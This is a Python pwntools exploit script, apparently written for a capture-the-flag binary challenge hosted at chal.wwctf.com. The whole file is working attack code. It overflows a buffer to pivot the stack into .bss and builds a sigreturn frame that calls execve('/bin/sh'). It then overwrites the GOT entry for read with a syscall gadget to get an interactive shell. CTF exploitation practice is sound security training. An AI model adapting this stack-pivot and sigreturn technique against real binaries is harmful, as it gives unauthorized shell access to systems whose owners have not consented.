#!/usr/bin/env python3
from pwn import *

elf = ELF("./main")
#libc = ELF("./")
#ld = ELF("./")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
'''

domain= "chal.wwctf.com"
port = 7003

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================

log.info("Preparing Pivoting to .bss & Fake Frame")
syscall = 0x000000000040117c
payload = flat({0x100:[elf.got["read"] + 0x100 + 0x100, elf.sym["main"] + 31]}, filler=b"A")
r.send(payload)

frame = SigreturnFrame()
frame.rax = 59                              # syscall number for execve()
frame.rdi = elf.got["read"] + 0x8           # pointer to "/bin/sh" 
frame.rsi = 0                               # NULL
frame.rdx = 0                               # NULL
frame.rip = syscall                         # syscall address
frame.uc_flags = syscall
frame.csgsfs = (0x002b * 0x1000000000000) | (0x0000 * 0x100000000) | (0x0000 * 0x10000) | (0x0033 * 0x1)
frame = bytes(frame)

log.info("Frame length: %#x", len(frame))

log.info("Sending Fake Frame and preparing GOT read RIP")
# RBP(rt_sigreturn + 0x100) + RIP
payload2 = flat({0:[0x100 + 0xf, elf.sym["main"]+31, frame[0x8:0xf8]],
                    0x100:[elf.got["read"] + 0x100, elf.sym["main"] + 31]}, filler=b"\x00")
r.send(payload2)

log.info("Overwriting got read to syscall & get shell wi")
# Overwrite read to syscall
r.send(p64(syscall) + p64(u64(b"/bin/sh\x00")))
r.interactive()

